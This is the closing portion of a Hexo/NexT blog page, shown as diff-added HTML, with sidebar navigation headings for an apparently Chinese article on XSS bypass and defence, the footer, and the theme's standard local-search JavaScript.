class="nav-number">1.6.1.4.</span> <span class="nav-text">使用Css绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扰乱规则"><span class="nav-number">1.6.2.</span> <span class="nav-text">扰乱规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用字符编码"><span class="nav-number">1.6.3.</span> <span class="nav-text">利用字符编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拆分法"><span class="nav-number">1.6.4.</span> <span class="nav-text">拆分法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-XSS防御"><span class="nav-number">1.7.</span> <span class="nav-text">7) XSS防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#输入"><span class="nav-number">1.7.1.</span> <span class="nav-text">输入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输出"><span class="nav-number">1.7.2.</span> <span class="nav-text">输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">1.7.3.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#写在最后"><span class="nav-number">2.</span> <span class="nav-text">写在最后</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附录"><span class="nav-number">4.</span> <span class="nav-text">附录</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yunen</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+<script type="text/javascript" src="/js/src/baidu.js"></script>
+</html>
